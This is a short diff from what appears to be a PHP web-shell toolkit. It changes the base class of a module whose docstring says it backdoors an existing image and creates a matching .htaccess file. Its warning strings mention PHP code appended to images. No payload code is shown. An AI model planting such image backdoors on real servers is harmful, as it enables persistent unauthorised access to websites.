@@ -4,7 +4,7 @@ Created on 22/ago/2011
 @author: norby
 '''
 
-from core.moduleprobe import ModuleProbe
+from core.module import Module
 from core.moduleexception import ModuleException
 from core.backdoor import Backdoor
 from os import path, mkdir
@@ -22,7 +22,7 @@ WARN_COPY_FAIL = 'Copy fail'
 WARN_PHP = 'Can\'t execute PHP interpreter'
 WARN_PHP_TEST = 'Error executing php code appended at image. Retry with simpler image or blank gif'
 
-class Img(ModuleProbe):
+class Img(Module):
     """Backdoor existing image and create related .htaccess"""
 
     def _set_args(self):
